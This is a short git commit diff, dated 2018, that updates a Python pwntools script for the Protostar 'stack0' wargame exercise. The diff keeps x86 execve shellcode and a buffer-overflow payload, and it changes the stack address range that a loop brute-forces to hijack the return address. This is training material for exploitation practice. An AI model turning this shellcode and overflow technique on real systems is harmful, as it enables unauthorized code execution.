7467dd83ab8f441f52e26db86426b8be8d64f2e7
Đào Trọng Nghĩa <nghiadtse05330@fpt.edu.vn>
2018-03-02 04:00:29 +0700

    Update stack0-2-brutestack.py

--- 2018/protostar/stack0/stack0-2-brutestack.py
+++ 2018/protostar/stack0/stack0-2-brutestack.py
@@ -6,9 +6,9 @@ shellcode ="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1
 i=0
 while (k):
 	try:
-		print hex(0xffffc000+i)
+		print hex(0xffffd000+i)
 		r=process("./stack0",aslr=False)
-		r.sendline(shellcode +'A'*(0x5c-len(shellcode)-0x10+0x4)+p32(0xffffc000+i))
+		r.sendline(shellcode +'A'*(0x5c-len(shellcode)-0x10+0x4)+p32(0xffffd000+i))
 		p=r.poll(True)
 		print p
 		if (p!=-4 or p!=-11):
